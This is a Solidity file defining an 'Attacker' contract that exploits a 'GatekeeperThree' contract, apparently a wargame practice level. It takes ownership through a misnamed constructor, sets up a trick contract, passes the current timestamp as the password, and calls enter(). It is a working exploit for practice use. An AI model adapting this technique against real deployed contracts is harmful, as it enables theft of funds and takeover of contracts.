pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";   

contract Attacker {
    GatekeeperThree gatekeeperThree;
    constructor(address payable gatekeeperThreeAddress) {
        gatekeeperThree = GatekeeperThree(gatekeeperThreeAddress);
    }

    function attack() external {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
        gatekeeperThree.enter();
    }

    //function construct0r() external {
    //    gatekeeperThree.construct0r();
    //}
//
    //function getAllowance(uint password) external {
    //    gatekeeperThree.getAllowance(password);
    //}
//
    //function trickInit() external {
    //    gatekeeperThree.createTrick();
    //}
//
    //function enter() external {
    //    gatekeeperThree.enter();
    //}

    //receive() external payable {//

    //}

}